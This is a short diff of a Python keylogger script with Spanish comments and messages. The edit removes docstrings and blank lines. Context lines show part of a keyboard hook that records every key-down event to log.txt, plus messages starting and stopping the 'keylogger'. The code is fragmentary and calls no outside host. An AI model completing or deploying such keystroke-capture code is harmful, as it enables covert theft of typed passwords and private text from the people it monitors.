@@ -6,10 +6,7 @@ import os
 LOG_FILE = "log.txt"
 
 def on_key_event(event):
-    """
-    Maneja el evento de pulsación de tecla y lo registra en el archivo.
-    Solo registra la pulsación de la tecla (KEY_DOWN).
-    """
+  
     if event.event_type == keyboard.KEY_DOWN:
         key_name = event.name
         
@@ -30,9 +27,7 @@ def on_key_event(event):
             print(f"[!] Error al escribir en el archivo de log: {e}")
 
 def main():
-    """
-    Función principal para inicializar y mantener el keylogger activo.
-    """
+ 
    
     GREEN = '\033[92m'
     RESET = '\033[0m'
@@ -67,4 +62,5 @@ def main():
         print("\n[+] Keylogger detenido. Revisar el archivo de log.")
 
 if __name__ == "__main__":
+
     main()
